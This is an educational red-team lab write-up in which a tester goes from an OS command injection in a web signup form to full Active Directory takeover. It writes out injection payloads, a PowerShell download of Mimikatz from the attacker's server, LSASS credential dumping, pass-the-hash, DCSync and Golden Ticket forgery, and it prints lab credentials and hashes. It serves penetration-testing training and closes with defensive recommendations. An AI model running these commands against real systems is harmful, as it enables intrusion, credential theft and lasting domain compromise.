# CRTA Lab Writeup

**Author:** CRTA Lab Exercise\
**Type:** Red Team Engagement\
**Scope:** External Web App → Full Domain Compromise\
**Classification:** Educational

***

## Table of Contents

1. [Executive Summary](crta-lab-writeup.md#executive-summary)
2. [Scope & Environment](crta-lab-writeup.md#scope--environment)
3. [Phase 1 — Web Application Recon & Command Injection](crta-lab-writeup.md#phase-1--web-application-recon--command-injection)
4. [Phase 2 — Linux System Enumeration](crta-lab-writeup.md#phase-2--linux-system-enumeration)
5. [Phase 3 — SSH Access (Stable Shell)](crta-lab-writeup.md#phase-3--ssh-access-stable-shell)
6. [Phase 4 — Internal Network Discovery](crta-lab-writeup.md#phase-4--internal-network-discovery)
7. [Phase 5 — Pivoting with Ligolo-ng & ProxyChains](crta-lab-writeup.md#phase-5--pivoting-with-ligolo-ng--proxychains)
8. [Phase 6 — Internal Host Discovery via Nmap](crta-lab-writeup.md#phase-6--internal-host-discovery-via-nmap)
9. [Phase 7 — Browser Artifact & Credential Discovery](crta-lab-writeup.md#phase-7--browser-artifact--credential-discovery)
10. [Phase 8 — MGMT Server Compromise](crta-lab-writeup.md#phase-8--mgmt-server-compromise)
11. [Phase 9 — BloodHound AD Enumeration](crta-lab-writeup.md#phase-9--bloodhound-ad-enumeration)
12. [Phase 10 — Credential Dumping with Mimikatz](crta-lab-writeup.md#phase-10--credential-dumping-with-mimikatz)
13. [Phase 11 — Domain Admin Escalation via GenericWrite](crta-lab-writeup.md#phase-11--domain-admin-escalation-via-genericwrite)
14. [Phase 12 — DCSync Attack](crta-lab-writeup.md#phase-12--dcsync-attack)
15. [Phase 13 — Golden Ticket Attack](crta-lab-writeup.md#phase-13--golden-ticket-attack)
16. [Full Attack Chain Summary](crta-lab-writeup.md#full-attack-chain-summary)
17. [Defensive Recommendations](crta-lab-writeup.md#defensive-recommendations)

***

## Executive Summary

This writeup documents a complete Active Directory compromise performed during the CRTA (Certified Red Team Analyst) lab exercise. The attack chain begins with a vulnerable external web application and ends in **full domain takeover via a Golden Ticket**. It is written so a junior penetration tester can follow every step, understand why each technique works, and use it as a learning reference.

| Milestone                         | Result     |
| --------------------------------- | ---------- |
| Remote Code Execution via Web App | ✅ Achieved |
| Stable SSH Shell                  | ✅ Achieved |
| Internal Network Pivot            | ✅ Achieved |
| Active Directory Enumeration      | ✅ Achieved |
| Credential Dump (Mimikatz)        | ✅ Achieved |
| Domain Admin Privileges           | ✅ Achieved |
| DCSync — All Domain Hashes        | ✅ Achieved |
| Golden Ticket Persistence         | ✅ Achieved |

***

## Scope & Environment

| Network             | Range             | Notes                                                  |
| ------------------- | ----------------- | ------------------------------------------------------ |
| VPN / Attacker      | `10.10.200.0/24`  | Attacker entry point                                   |
| External Network    | `192.168.80.0/24` | Hosts vulnerable web app · `192.168.80.1` out of scope |
| Internal AD Network | `192.168.98.0/24` | Domain Controller & MGMT · `192.168.98.1` out of scope |

![Lab environment — network overview](<../../.gitbook/assets/Unknown image>)

> _Lab environment — network overview_

![Scope detail — external and internal network ranges](<../../.gitbook/assets/Unknown image (1)>)

> _Scope detail — external and internal network ranges_

![Lab environment — Active Directory infrastructure](<../../.gitbook/assets/Unknown image (2)>)

> _Lab environment — Active Directory infrastructure_

***

## Phase 1 — Web Application Recon & Command Injection

### Objective

Identify exposed functionality in the web application and test input fields for injection vulnerabilities.

**Target:** `http://192.168.80.10/`

The application exposed a **login page** and a **signup page**. No obvious vulnerabilities were visible at first glance, so all input fields were manually tested with injection payloads.

![Web application — login and signup pages exposed](<../../.gitbook/assets/Unknown image (3)>)

> _Web application — login and signup pages exposed_

### Finding — OS Command Injection in the Email Field

The email parameter in the signup form was found to be vulnerable to OS Command Injection. The application passes user input directly into a backend shell command without any sanitisation.

The following payloads were tested:

```bash
# Payload 1 — semicolon separator
# The semicolon ends the first command and starts a new one
test@test.com; id

# Payload 2 — logical AND
# The second command runs only if the first succeeds
test@test.com && whoami
```

Both payloads executed successfully on the backend Linux server, confirming **full OS-level Remote Code Execution (RCE)**.

![Injection payload — testing the email parameter](<../../.gitbook/assets/Unknown image (4)>)

> _Injection payload — testing the email parameter_

![RCE confirmed — command output returned in the HTTP response](<../../.gitbook/assets/Unknown image (5)>)

> _RCE confirmed — command output returned in the HTTP response_

![Arbitrary command execution — full shell access via the web app](<../../.gitbook/assets/Unknown image (6)>)

> _Arbitrary command execution — full shell access via the web app_

### Credential Discovery via /etc/passwd

With RCE confirmed, the `/etc/passwd` file was read to enumerate all local user accounts on the server:

```bash
cat /etc/passwd
```

A local user named `privilege` was found. Further enumeration of the filesystem revealed **plaintext credentials** stored on the server:

```
Username: privilege
Password: Admin@962
```

![Plaintext credentials found on the server](<../../.gitbook/assets/Unknown image (7)>)

> _Plaintext credentials found on the server_

> **🔑 Key Takeaway for Junior Testers**
>
> Always test every input field — especially email fields — with OS command injection payloads. The characters `;`, `&&`, `|`, and backticks are **shell metacharacters** that can break out of an intended command context. Web applications that run backend shell commands (e.g. to send emails or run scripts) are common targets for this class of attack.
>
> The vulnerability here is a classic **OS Command Injection (OWASP A03:2021)**. The fix is to never pass user input directly into a shell call, and to validate/allowlist all inputs.

***

## Phase 2 — Linux System Enumeration

### Objective

Gather information about the compromised system: local users, internal network interfaces, and any stored credentials.

### Reading /etc/passwd

```bash
cat /etc/passwd
```

This file is **world-readable** on all Linux systems and lists every local account, its home directory, and its login shell. It is always one of the first things to check after gaining a foothold. The best thing is that the password appeared in plaintext when we used the given command. That is `Password: Admin@962`

| What to look for  | Why it matters                                       |
| ----------------- | ---------------------------------------------------- |
| Usernames         | Targets for password spraying and lateral movement   |
| Home directories  | Where personal files, SSH keys, and credentials live |
| `/bin/bash` shell | The account can log in interactively                 |
| Service accounts  | May have special privileges or weak configurations   |

> **🔑 Key Takeaway for Junior Testers**
>
> Even though passwords are no longer stored in `/etc/passwd` (they moved to `/etc/shadow`), the usernames alone are valuable intelligence. They help you map out who uses the machine and what accounts to target next.

***

## Phase 3 — SSH Access (Stable Shell)

### Objective

Convert the unreliable web shell into a **stable, fully interactive SSH session**.

### Why This Step Matters

A web shell is a foothold — not a working environment. It is fragile, often has no TTY, times out easily, and prevents many post-exploitation tools from running correctly. The moment plaintext credentials were found, the priority was to use them to get a proper shell.

```bash
ssh privilege@192.168.80.10
# Password: Admin@962
```

Authentication succeeded and a full interactive terminal was obtained.

![SSH login — authenticated as 'privilege' using recovered credentials](<../../.gitbook/assets/Unknown image (8)>)

> _SSH login — authenticated as 'privilege' using recovered credentials_

| Feature       | Web Shell                  | SSH                   |
| ------------- | -------------------------- | --------------------- |
| Stability     | Fragile, prone to timeouts | Very stable           |
| Interactivity | No TTY, limited            | Full terminal         |
| Tool support  | Very restricted            | Run anything          |
| Persistence   | Session-based only         | Can reconnect anytime |

> **🔑 Key Takeaway for Junior Testers**
>
> A web shell is a _foothold_, not a destination. The very first thing you should do after getting RCE is upgrade to a proper shell. SSH is ideal when credentials are available — it is stable, encrypted, and gives you a full TTY that makes all post-exploitation tools work properly.

***

## Phase 4 — Internal Network Discovery

### Objective

Determine whether the compromised host is connected to any additional networks that could be used as a pivot point.

### Command Used

```bash
ip a
```

### Discovery — Dual-Homed Host

Two network interfaces were found on the compromised machine:

```
eth0: 192.168.80.10/24    ← External network (we came from here)
eth1: 192.168.98.15/24    ← Internal AD network (new territory!)
```

This machine is **dual-homed** — connected to both the external and internal network simultaneously. It acts as a natural bridge between the two environments.

> **🔑 Key Takeaway for Junior Testers**
>
> Always run `ip a` (or `ifconfig`) on every compromised Linux host. A dual-homed host is a pivoting goldmine — it acts as a bridge to network segments that would otherwise be completely unreachable from your attack machine. Without discovering this single detail, the entire Active Directory environment would have remained invisible.

***

## Phase 5 — Pivoting with Ligolo-ng & ProxyChains

### Objective

Establish a tunnel through the compromised Linux host so that tools running on the Kali attack machine can reach the internal Windows network `192.168.98.0/24`.

### Tool: Ligolo-ng

Ligolo-ng creates an **encrypted tunnel** between the attacker and a pivot host. Once the tunnel is up, traffic destined for the internal network is routed through the compromised machine transparently.

### Step 1 — Start the Ligolo Proxy on Kali

```bash
ligolo-proxy -selfcert
```

| Flag        | Meaning                                                              |
| ----------- | -------------------------------------------------------------------- |
| `-selfcert` | Automatically generates a self-signed TLS certificate for the tunnel |

### Step 2 — Configure ProxyChains

ProxyChains intercepts outgoing network calls from tools and redirects them through a SOCKS proxy — in this case, the one Ligolo-ng creates on port 1080.

```bash
sudo nano /etc/proxychains4.conf

# Add this line at the bottom of the file:
socks5 127.0.0.1 1080
```

### Step 3 — Using the Tunnel

Prepend any offensive tool with `proxychains` to automatically route it through the pivot:

```bash
proxychains nmap ...
proxychains nxc smb ...
proxychains wmiexec.py ...
proxychains secretsdump.py ...
```

> **🔑 Key Takeaway for Junior Testers**
>
> Pivoting is one of the most critical skills in internal penetration testing. The mental model is simple: **foothold → tunnel → pivot → internal network**. Ligolo-ng is preferred over older tools like `sshuttle` or `chisel` because it handles full TCP routing cleanly. ProxyChains is the "wrapper" that forces existing tools through the tunnel without needing to modify them.

***

## Phase 6 — Internal Host Discovery via Nmap

### Objective

Identify live Windows hosts inside the `192.168.98.0/24` network.

### Initial Attempt — ICMP Ping Sweep (Failed)

```bash
proxychains nmap -sn 192.168.98.0/24
# Result: 0 hosts up
```

This returned nothing because **Windows firewalls block ICMP echo requests (ping) by default**. The hosts were alive — just invisible to ping-based discovery.

### Solution — TCP Port Scan

```bash
proxychains nmap -Pn -sT --open \
  -p 22,80,135,139,445,3389,5985 \
  192.168.98.0/24
```

| Flag                       | Meaning                                                                   |
| -------------------------- | ------------------------------------------------------------------------- |
| `-Pn`                      | Skip host discovery — treat every address as alive, bypassing ICMP blocks |
| `-sT`                      | TCP Connect scan — required through ProxyChains; raw SYN scans won't work |
| `--open`                   | Only show hosts that have at least one open port                          |
| `-p 135,139,445,3389,5985` | Windows signature ports: RPC, SMB, RDP, and WinRM                         |

### Hosts Discovered

| IP Address       | Hostname | Role                   |
| ---------------- | -------- | ---------------------- |
| `192.168.98.30`  | MGMT     | Management workstation |
| `192.168.98.120` | CDC      | Domain Controller      |

> **🔑 Key Takeaway for Junior Testers**
>
> Never rely on ICMP for Windows host discovery. Always use `-Pn` combined with a TCP scan. The ports chosen here are "Windows signature ports" — if you see 445 (SMB) and 135 (RPC) open together, it is almost certainly a Windows machine. Port **5985 (WinRM)** is especially valuable — it enables Evil-WinRM for remote PowerShell sessions without needing to drop any tools.

***

## Phase 7 — Browser Artifact & Credential Discovery

### Objective

Search the compromised Linux host for credentials that could provide access into the Active Directory environment.

### Tool: LinPEAS

LinPEAS (Linux Privilege Escalation Awesome Script) was run on the compromised host to automatically enumerate sensitive files, credentials, misconfigurations, and escalation opportunities.

```bash
./linpeas.sh
```

LinPEAS discovered **Firefox browser databases** in the user's home directory — SQLite files that store saved passwords, cookies, and session data.

![LinPEAS output — browser database identified on the system](<../../.gitbook/assets/Unknown image (9)>)

> _LinPEAS output — browser database identified on the system_

![Firefox profile directory — SQLite database location found](<../../.gitbook/assets/Unknown image (10)>)

> _Firefox profile directory — SQLite database location found_

### Querying the Firefox SQLite Database

Firefox stores its data in SQLite format, which can be queried directly from the command line without any special tools.

```bash
# Step 1 — Find all SQLite databases in the user home directory
find /home/privilege -name "*.sqlite"

# Step 2 — Open the Firefox cookies/credentials database
sqlite3 ~/.mozilla/firefox/*/cookies.sqlite

# Step 3 — List all tables inside the database
.tables

# Step 4 — Dump all stored cookies and credentials
SELECT * FROM moz_cookies;
```

![SQLite query — Active Directory credentials recovered from Firefox database](<../../.gitbook/assets/Unknown image (11)>)

> _SQLite query — Active Directory credentials recovered from Firefox database_

### Credentials Recovered

```
Username: john@child.warfare.corp
Password: User1@#$%6
```

These are **domain credentials** for the `child.warfare.corp` Active Directory domain.

> **🔑 Key Takeaway for Junior Testers**
>
> Browser databases are a goldmine during post-exploitation. Users frequently save passwords to internal applications, VPNs, and admin panels in their browser. Firefox stores everything under `~/.mozilla/`. Chrome uses `~/.config/google-chrome/`. LinPEAS highlights these locations automatically — always read its output carefully. In this case, credentials found in a browser database on a Linux web server became the **bridge into Active Directory**.

***

## Phase 8 — John User Compromised

### Objective

Validate the recovered Active Directory credentials and determine what level of access they provide on internal Windows hosts.

### Tool: NetExec (nxc)

NetExec (formerly CrackMapExec) is used to test credentials against Windows services like SMB, WinRM, and RDP.

```bash
proxychains nxc smb 192.168.98.30 \
  -u john \
  -p 'User1@#$%6'
```

| Flag              | Meaning                                 |
| ----------------- | --------------------------------------- |
| `smb`             | Test against the SMB service (port 445) |
| `-u john`         | Username to authenticate with           |
| `-p 'User1@#$%6'` | Password to test                        |

### Result

```
SMB  192.168.98.30  445  john  [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
```

![NetExec — (Pwn3d!) confirms john has local administrator privileges on MGMT](<../../.gitbook/assets/Unknown image (12)>)

> _NetExec — (Pwn3d!) confirms john has local administrator privileges on MGMT_

The `(Pwn3d!)` response from NetExec means **john has local administrator privileges** on the MGMT server. This is a critical finding — local admin access enables reading LSASS memory, running Mimikatz, and dumping all credentials cached on that machine.

> **🔑 Key Takeaway for Junior Testers**
>
> `(Pwn3d!)` in NetExec output is one of the best things you can see during an internal engagement. It means the account is in the local Administrators group on that machine. Even if `john` is just a regular domain user, local admin access on any machine allows credential dumping — and those dumped credentials might belong to much more privileged accounts that previously logged into that machine.

***

## Phase 9 — BloodHound AD Enumeration

### Objective

Map the Active Directory environment to find **privilege escalation paths** and identify which accounts and permissions can be abused to reach Domain Admin.

### What is BloodHound?

BloodHound collects AD relationship data (users, groups, ACLs, sessions, trusts) and displays it as an interactive graph. It shows:

* Who has admin rights on which machines
* Which accounts have dangerous AD permissions (GenericWrite, WriteDACL, GenericAll, etc.)
* Where privileged users currently have active sessions
* The shortest attack path from any account to Domain Admin

![BloodHound — attack path visualisation from john to Domain Admin](<../../.gitbook/assets/Unknown image (13)>)

> _BloodHound — attack path visualisation from john to Domain Admin_

### Key Attack Path Discovered

BloodHound revealed the following escalation chain:

```
john
  --[AdminTo]--> MGMT
  --[HasSession]--> CORPMNGR (active session on MGMT)
  --[GenericWrite]--> Domain Admins group
```

**In plain English:**

1. `john` is a **local administrator on MGMT** (confirmed by NetExec)
2. `CORPMNGR` has an **active session on MGMT** — its credentials are cached in LSASS memory right now
3. `CORPMNGR` has **GenericWrite** permission over the `Domain Admins` group — meaning it can **add any user to Domain Admins**

This gives us a clear three-step path: dump CORPMNGR's hash from MGMT → authenticate as CORPMNGR → add john to Domain Admins.

> **🔑 Key Takeaway for Junior Testers**
>
> BloodHound is one of the most powerful tools in any AD engagement. The `GenericWrite` permission on a group allows modification of its `member` attribute — meaning whoever holds it can silently add themselves or any other account to that group. **This is not a software bug — it is an Active Directory misconfiguration.** Someone granted CORPMNGR excessive permissions on a highly sensitive group. BloodHound makes these invisible misconfigurations immediately visible.

***

## Phase 10 — Credential Dumping with Mimikatz

### Objective

Dump the **CORPMNGR** account's credentials from LSASS memory on the MGMT server, where BloodHound confirmed it has an active session.

### Why LSASS?

LSASS (Local Security Authority Subsystem Service) is a core Windows process that manages authentication. It **caches the credentials of all users who have logged in** to the machine — including their NTLM hashes and, in some configurations, plaintext passwords. With local administrator access, Mimikatz can read this process's memory and extract those cached credentials.

![CORPMNGR active session on MGMT — confirmed credential dump target](<../../.gitbook/assets/Unknown image (14)>)

> _CORPMNGR active session on MGMT — confirmed credential dump target_

### Step 1 — Host Mimikatz on Kali (HTTP Server)

```bash
python3 -m http.server 8000
```

This starts a simple HTTP server on the attacker machine so the target can download Mimikatz.

### Step 2 — Download Mimikatz onto the Target via NetExec

```bash
proxychains nxc smb 192.168.98.30 \
  -u john \
  -p 'User1@#$%6' \
  -x "powershell wget http://10.10.200.30:8000/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe"
```

| Flag       | Meaning                                                       |
| ---------- | ------------------------------------------------------------- |
| `-x`       | Execute this command on the remote system via SMB             |
| `wget`     | PowerShell alias for `Invoke-WebRequest` — downloads the file |
| `-OutFile` | Where to save the downloaded file on the target               |

### Step 3 — Execute Mimikatz and Dump LSASS

```bash
proxychains nxc smb 192.168.98.30 \
  -u john \
  -p 'User1@#$%6' \
  -x "C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::logonpasswords exit"
```

| Mimikatz Command           | Meaning                                                     |
| -------------------------- | ----------------------------------------------------------- |
| `privilege::debug`         | Requests `SeDebugPrivilege` — required to read LSASS memory |
| `sekurlsa::logonpasswords` | Dumps all credentials cached in LSASS memory                |
| `exit`                     | Closes Mimikatz cleanly after executing                     |

![Mimikatz output — CORPMNGR NTLM hash successfully extracted from LSASS](<../../.gitbook/assets/Unknown image (15)>)

> _Mimikatz output — CORPMNGR NTLM hash successfully extracted from LSASS_

### Credentials Recovered

```
Account:   CORPMNGR
NTLM Hash: 4cb3933610b827a281ec479031128cc6
```

> **🔑 Key Takeaway for Junior Testers**
>
> Mimikatz's `sekurlsa::logonpasswords` is one of the most well-known post-exploitation commands in Windows pentesting. It works because Windows caches credentials in LSASS memory after login — even after the user logs out. BloodHound told us _exactly_ where CORPMNGR's credentials would be cached. This is why mapping the environment with BloodHound _before_ credential dumping is so important — it tells you which machine to target.

***

## Phase 11 — Domain Admin Escalation via GenericWrite

### Objective

Use the recovered CORPMNGR hash to authenticate to the Domain Controller and abuse the GenericWrite permission to **add john to Domain Admins**.

### Step 1 — Pass-the-Hash to the Domain Controller

**Pass-the-Hash (PtH)** is a technique where you authenticate using an NTLM hash _directly_, without knowing the plaintext password. Windows NTLM authentication accepts the hash itself as proof of identity.

```bash
proxychains wmiexec.py \
  child.warfare.corp/corpmngr@192.168.98.120 \
  -hashes :4cb3933610b827a281ec479031128cc6
```

| Flag                          | Meaning                                           |
| ----------------------------- | ------------------------------------------------- |
| `child.warfare.corp/corpmngr` | `DOMAIN\Username` format for authentication       |
| `@192.168.98.120`             | IP address of the Domain Controller               |
| `-hashes :NTLM`               | `LM:NTLM` format — LM part is left blank with `:` |

### Step 2 — Add john to Domain Admins

Once authenticated to the Domain Controller as CORPMNGR:

```bash
net group "Domain Admins" john /add /domain
```

![net group command — john successfully added to the Domain Admins group](<../../.gitbook/assets/Unknown image (16)>)

> _net group command — john successfully added to the Domain Admins group_

The command completed successfully. `john` is now a **Domain Administrator**.

> **🔑 Key Takeaway for Junior Testers**
>
> Pass-the-Hash works because Windows NTLM does not verify that you _know_ the password — it only verifies that you have the correct hash. This is why dumped NTLM hashes are treated as equivalent to plaintext passwords in an AD environment.
>
> The `GenericWrite` permission abused here is a **misconfigured Active Directory ACL**. ACL-based privilege escalation is one of the most common real-world attack paths in enterprise AD environments. `GenericWrite`, `WriteDACL`, `GenericAll`, and `ForceChangePassword` are the most dangerous permissions to look for, and BloodHound surfaces all of them automatically.

***

## Phase 12 — DCSync Attack

### Objective

Use Domain Admin privileges to extract **all password hashes from the Domain Controller**, including the critical `KRBTGT` account hash.

### What is DCSync?

DCSync is a technique that impersonates a Domain Controller and requests password replication data from another DC using Microsoft's **Directory Replication Service (MS-DRSR)** protocol. This is the same protocol real Domain Controllers use to synchronise with each other.

Key facts about DCSync:

* Requires **Domain Admin** (or replication rights)
* Does **not** touch the DC's disk
* Extracts **all** account hashes, including KRBTGT
* Looks like legitimate DC-to-DC replication traffic

### Command Used

```bash
proxychains secretsdump.py \
  child.warfare.corp/john:'User1@#$%6'@192.168.98.120
```

| Part                      | Meaning                                                             |
| ------------------------- | ------------------------------------------------------------------- |
| `secretsdump.py`          | Impacket tool that performs DCSync and remote credential extraction |
| `child.warfare.corp/john` | Authenticated as john (now Domain Admin)                            |
| `@192.168.98.120`         | Target — the Domain Controller's IP address                         |

![DCSync — all domain hashes extracted including the critical KRBTGT hash](<../../.gitbook/assets/Unknown image (17)>)

> _DCSync — all domain hashes extracted including the critical KRBTGT hash_

### Critical Hash Recovered

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
```

> **🔑 Key Takeaway for Junior Testers**
>
> DCSync is the "end game" of most AD engagements. It does not require running any code on the DC itself — it abuses a legitimate replication protocol. The `KRBTGT` hash is the most sensitive secret in any Active Directory environment. It is used to **sign and encrypt every Kerberos ticket** in the domain. Whoever holds this hash can forge tickets for any user, impersonate Domain Admins, and maintain access permanently — even after all user passwords are reset.

***

### Phase 13 — Golden Ticket Attack

#### Objective

Forge a **Kerberos Golden Ticket** using the KRBTGT hash to create a permanent, password-reset-resistant backdoor into the domain.

#### What is a Golden Ticket?

A Golden Ticket is a **forged Kerberos TGT (Ticket Granting Ticket)** signed with the real KRBTGT hash. Because it is cryptographically valid, every Domain Controller in the forest accepts it as legitimate.

Properties of a Golden Ticket:

* Can be created **offline** with no interaction with the DC
* Can **impersonate any user** in the domain
* Survives **password resets** of all user accounts
* Only invalidated by resetting the KRBTGT password **twice**

#### Step 1 — Retrieve the Domain SID

The Domain SID is embedded in all Kerberos tickets and is required to forge a valid one.

```bash
proxychains lookupsid.py \
  child.warfare.corp/john:'User1@#$%6'@192.168.98.120
```

![lookupsid.py — Domain SID successfully retrieved](<../../.gitbook/assets/Unknown image (18)>)

> _lookupsid.py — Domain SID successfully retrieved_

```
Domain SID: S-1-5-21-3754860944-83624914-1883974761
```

#### Step 2 — Forge the Golden Ticket

```bash
ticketer.py \
  -nthash e57dd34c1871b7a23fb17a77dec9b900 \
  -domain child.warfare.corp \
  -domain-sid S-1-5-21-3754860944-83624914-1883974761 \
  administrator
```

| Flag            | Meaning                                                                 |
| --------------- | ----------------------------------------------------------------------- |
| `-nthash`       | The KRBTGT NTLM hash — used to cryptographically sign the forged ticket |
| `-domain`       | The target domain's fully qualified domain name (FQDN)                  |
| `-domain-sid`   | The domain Security Identifier — embedded in the ticket structure       |
| `administrator` | The username to impersonate in the forged ticket                        |

This produces a file called `administrator.ccache` — the forged Kerberos ticket.

![ticketer.py — Golden Ticket forged and saved as administrator.ccache](<../../.gitbook/assets/Unknown image (19)>)

> _ticketer.py — Golden Ticket forged and saved as administrator.ccache_

#### Step 3 — Load the Ticket into the Current Session

```bash
export KRB5CCNAME=administrator.ccache
```

This environment variable tells all Kerberos-aware tools to use this specific ticket file for authentication instead of a password or hash.

#### Step 4 — Verify the Ticket is Loaded

```bash
klist
```

This command lists all currently loaded Kerberos tickets. You should see a valid TGT for `administrator@child.warfare.corp` with a long validity period.

![klist — forged administrator Golden Ticket loaded and verified](<../../.gitbook/assets/Unknown image (20)>)

> _klist — forged administrator Golden Ticket loaded and verified_

#### Step 5 — Authenticate to the Domain Controller Using the Golden Ticket

```bash
proxychains wmiexec.py \
  -k -no-pass \
  -dc-ip 192.168.98.120 \
  child.warfare.corp/administrator@192.168.98.120
```

| Flag       | Meaning                                                          |
| ---------- | ---------------------------------------------------------------- |
| `-k`       | Use Kerberos authentication (loads the `.ccache` ticket)         |
| `-no-pass` | Do not prompt for a password — the ticket handles authentication |
| `-dc-ip`   | Specify the Domain Controller IP for Kerberos ticket validation  |

![wmiexec.py — full Domain Controller shell obtained via Golden Ticket](<../../.gitbook/assets/Unknown image (21)>)

> _wmiexec.py — full Domain Controller shell obtained via Golden Ticket_

A shell on the Domain Controller was obtained as `administrator`. **The domain is fully compromised.**

> **🔑 Key Takeaway for Junior Testers**
>
> The Golden Ticket represents the final and most persistent stage of an Active Directory compromise. At this point, resetting passwords does nothing. Changing the administrator's password does nothing. The only remediation is to **reset the KRBTGT password twice** — because one reset leaves the previous key material valid for the duration of the ticket's lifetime. In real incident response, a confirmed Golden Ticket means the entire Active Directory forest must be treated as untrusted until fully remediated.

***

### Full Attack Chain Summary

```
[1] Web Application Recon
      └─ Discovered login/signup pages at http://192.168.80.10/

[2] OS Command Injection
      └─ Email field → OS RCE → cat /etc/passwd → user 'privilege' found
      └─ Plaintext credentials: Admin@962

[3] SSH Access
      └─ ssh privilege@192.168.80.10
      └─ Stable, fully interactive terminal obtained

[4] Internal Network Discovery
      └─ ip a → eth1: 192.168.98.15/24
      └─ Host is dual-homed → internal AD network reachable

[5] Pivoting
      └─ Ligolo-ng tunnel + ProxyChains configured
      └─ 192.168.98.0/24 fully accessible from Kali

[6] Internal Host Discovery
      └─ nmap -Pn -sT → MGMT (98.30) + Domain Controller (98.120)

[7] Browser Artifact Discovery
      └─ LinPEAS → Firefox SQLite database
      └─ john@child.warfare.corp : User1@#$%6

[8] MGMT Compromise
      └─ nxc smb 192.168.98.30 -u john -p 'User1@#$%6'
      └─ Result: (Pwn3d!) — local administrator confirmed

[9] BloodHound Enumeration
      └─ john → AdminTo → MGMT
      └─ MGMT → HasSession → CORPMNGR
      └─ CORPMNGR → GenericWrite → Domain Admins

[10] Mimikatz Credential Dump
      └─ Dumped LSASS on MGMT
      └─ CORPMNGR NTLM: 4cb3933610b827a281ec479031128cc6

[11] Domain Admin Escalation
      └─ wmiexec.py PtH as CORPMNGR → Domain Controller
      └─ net group "Domain Admins" john /add /domain

[12] DCSync
      └─ secretsdump.py as john (Domain Admin)
      └─ KRBTGT hash: e57dd34c1871b7a23fb17a77dec9b900

[13] Golden Ticket
      └─ ticketer.py → forged administrator.ccache
      └─ wmiexec.py -k -no-pass → DC shell
      └─ PERSISTENT DOMAIN OWNERSHIP ACHIEVED
```

***

### Defensive Recommendations

| Vulnerability                                      | Recommended Fix                                                                                                              |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| OS Command Injection in web app                    | Sanitise all user input; use parameterised APIs; never pass user input directly into shell calls                             |
| Plaintext credentials stored on disk               | Use a secrets manager (e.g. HashiCorp Vault); never store credentials in plaintext files                                     |
| Credentials saved in browser on servers            | Enforce enterprise password managers; disable browser credential saving via GPO                                              |
| Local admin credentials reused across machines     | Deploy **LAPS** (Local Administrator Password Solution) to randomise local admin passwords per machine                       |
| CORPMNGR GenericWrite over Domain Admins           | Audit all AD ACLs with BloodHound; remove unnecessary permissions; enforce least privilege                                   |
| LSASS readable with local admin                    | Enable **Windows Credential Guard**; configure LSASS as a Protected Process Light (PPL)                                      |
| No detection of Mimikatz / DCSync / Golden Tickets | Deploy a SIEM with alerts for Mimikatz signatures, anomalous AD replication requests, and unusual Kerberos ticket properties |

***

_CRTA Lab Exercise — Educational Red Team Writeup_\
&#xNAN;_&#x46;or learning purposes only. All testing performed in an authorised lab environment._
